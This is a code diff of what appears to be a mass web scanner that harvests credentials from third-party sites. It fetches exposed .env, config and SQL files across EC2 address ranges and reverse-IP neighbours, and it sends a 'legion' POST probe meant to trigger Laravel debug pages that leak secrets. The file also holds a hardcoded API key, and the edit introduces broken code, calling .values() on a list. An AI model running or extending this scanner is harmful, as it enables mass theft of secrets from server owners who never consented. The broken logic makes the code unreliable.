@@ -62,7 +62,7 @@ BUNNY_API_KEY = "a34bea81-b348-49fb-a28ef869d967-3fe2-43fc"
 
 DNS_WORKERS_EC2 = 100
 DNS_TIMEOUT_EC2 = 3
-MAX_IPS_PER_CIDR = 20
+MAX_IPS_PER_CIDR = 5
 
 TOTAL_SLOTS = 2000
 NUM_WORKERS = 10
@@ -275,141 +275,39 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
         fake_for_site = False
         found_for_site = False
         headers_scout = dict(headers)
-        
+        findfile_requests = []
+        headers_file_probe = dict(headers)
+        headers_file_probe['Range'] = 'bytes=0-4096'
+
+
         env_batches = site_payloads.get('env', [])
         for batch in env_batches:
-            reqss = [grequests.get(url, stream=True, timeout=10, verify=False, allow_redirects=False, headers=headers_scout) for url in batch]
+            reqss = [grequests.get(url, stream=True, timeout=10, verify=False, allow_redirects=False) for url in batch]
             merdb = grequests.map(reqss)
             for r in merdb:
                 if r is not None and r.status_code in [200, 206, requests.codes.ok]:
-                    try:
-                        content = r.content
-                        content_lower = content.lower()
-                        if b'<pre' in content_lower and b'</pre>' in content_lower:
-                            fake_for_site = True
-                            r.close()
-                            break
-                        if b"popbox.fun" in content_lower:
-                            fake_for_site = True
-                            r.close()
-                            break
-                        head = content[:100]
-                        if b'<html' not in head.lower() and b'<!doctype' not in head.lower() and b'<body' not in head.lower():
-                            found_env_urls.append(r.url)
-                        r.close()
-                    except: pass
+                    findfile_requests.append(r)
                 if r: r.close()
-            if len(found_env_urls) >= 10:
+            if len(findfile_requests) >= 10:
                 fake_for_site = True
             if fake_for_site: break
             
         php_batches = site_payloads.get('php', [])
         for batch in php_batches:
-            reqss = [grequests.get(url, stream=True, timeout=10, verify=False, allow_redirects=False, headers=headers_scout) for url in batch]
+            reqss = [grequests.post(url, data={"0x01[]":"legion"}, timeout=6, stream=True, verify=False, allow_redirects=False, headers=headers_file_probe) for url in batch]
             merdb = grequests.map(reqss)
             for r in merdb:
                 if r is not None and r.status_code in [200, 206, requests.codes.ok]:
-                    found_php_urls.append(r.url)
+                    findfile_requests.append(r)
                 if r: r.close()
-            if len(found_php_urls) >= 10:
+            if len(findfile_requests) >= 10:
                 fake_for_site = True
                 break
             
-        urls_to_analyze = found_env_urls + found_php_urls
-        if not urls_to_analyze: return
         
-        seen_content_hashes = set()
-        headers_file_probe = dict(headers)
-        headers_file_probe['Range'] = 'bytes=0-4096'
-        
-        findfile_requests = []
-        for url in urls_to_analyze:
-            url_lower_check = url.lower()
-            is_static = any(x in url_lower_check for x in ['.env', '.js', '.json', '.txt', '.yml', '.yaml', '.ini', '.xml', '.log', '.zip', '.bak', '.sql', '.conf', 'config', '.local', '.remote', '.production', '.old', '.save', 'credentials', 'cache', 'laravel', 'public', 'pusher'])
-            if is_static:
-                req = grequests.get(url, timeout=6, stream=True, verify=False, allow_redirects=False, headers=headers_file_probe)
-            else:
-                req = grequests.post(url, data={"0x01[]":"legion"}, timeout=6, stream=True, verify=False, allow_redirects=False, headers=headers_file_probe)
-            findfile_requests.append(req)
-            
-        responsesf = grequests.map(findfile_requests)
-        unique_responses = {}
-        for r in responsesf:
-            if r is not None and r.status_code in [200, 206, requests.codes.ok]:
-                if r.url not in unique_responses:
-                    try:
-                        content = r.content
-                        url_lower = r.url.lower()
-                        content_len = len(content)
-                        if content_len < 10 or content_len > 1000000:
-                            r.close()
-                            continue
-                        is_html_doc = b'<html' in content[:200].lower() or b'<!doctype' in content[:200].lower()
-                        is_debug_page = False
-                        if is_html_doc:
-                            content_str_head = content[:5000].decode('utf-8', errors='ignore').lower()
-                            debug_keywords = ['phpinfo()', 'php version', 'zend extension', 'php license', 'sf-toolbar', 'symfony profiler', 'php-debugbar', 'whoops! there was an error', 'stack trace', 'aws_access_key_id', 'db_password', 'db_host', 'aws_secret']
-                            if any(k in content_str_head for k in debug_keywords):
-                                is_debug_page = True
-                        if is_html_doc and not is_debug_page:
-                            r.close()
-                            continue
-                        
-                        if b'.env' in url_lower.encode() or any(x in url_lower for x in ['.local', '.remote', '.production', 'config', 'credentials']):
-                            if b'=' not in content and b':' not in content:
-                                r.close()
-                                continue
-                        elif url_lower.endswith('.json'):
-                            stripped = content.strip()
-                            if not (stripped.startswith(b'{') or stripped.startswith(b'[')):
-                                r.close()
-                                continue
-                        elif url_lower.endswith('.xml'):
-                            if b'<?xml' not in content[:50] and b'<' not in content[:10]:
-                                r.close()
-                                continue
-                        elif any(url_lower.endswith(x) for x in ['.yml', '.yaml', '.ini', '.conf']):
-                            if b'=' not in content and b':' not in content:
-                                r.close()
-                                continue
-                        elif url_lower.endswith('.sql'):
-                            content_upper = content[:1000].upper()
-                            sql_keys = [b'INSERT INTO', b'CREATE TABLE', b'VALUES', b'SELECT', b'DROP TABLE', b'--']
-                            if not any(k in content_upper for k in sql_keys):
-                                r.close()
-                                continue
-                        elif url_lower.endswith('.js'):
-                            js_secrets = [b'api_key', b'apikey', b'secret', b'token', b'password', b'credential', b'auth', b'bearer', b'db_']
-                            if not any(k in content.lower() for k in js_secrets):
-                                r.close()
-                                continue
-                        elif url_lower.endswith('.log'):
-                            log_keys = [b'[202', b'[error]', b'[info]', b'[debug]', b'[warning]']
-                            if not any(k in content.lower() for k in log_keys):
-                                r.close()
-                                continue
-                                
-                        content_hash = hashlib.md5(content).hexdigest()
-                        if content_hash in seen_content_hashes:
-                            wildcard_strike_count += 1
-                            r.close()
-                            if wildcard_strike_count >= 5:
-                                fake_for_site = True
-                                break
-                            continue
-                        seen_content_hashes.add(content_hash)
-                        unique_responses[r.url] = r
-                    except:
-                        r.close()
-                else: r.close()
-            else:
-                if r: r.close()
-                
-        if fake_for_site: return
-        
-        valid_responzzz = list(unique_responses.values())
+        valid_responzzz = list(findfile_requests.values())
         if valid_responzzz:
-            for r in valid_responzzz:
+            for r in findfile_requests:
                 if r is None: continue
                 try:
                     contentsx = content_diablo_resp(r)
@@ -530,7 +428,10 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
             if target_ip:
                 cazzuno = reverse_ip_lookup(target_ip)
                 if cazzuno:
-                    process_urls(cazzuno, is_fallback=True)
+                    hostxxx_clean = hostxxx.lower().rstrip('/')
+                    cazzuno = [d for d in cazzuno if d.lower().rstrip('/') != hostxxx_clean]
+                    if cazzuno:
+                        process_urls(cazzuno, is_fallback=True)
                 
     except Exception as e:
         with open(os.path.join(result_dir, 'ERROR2.txt'), 'a', encoding='utf-8') as f: f.write(str(e) + '\n')
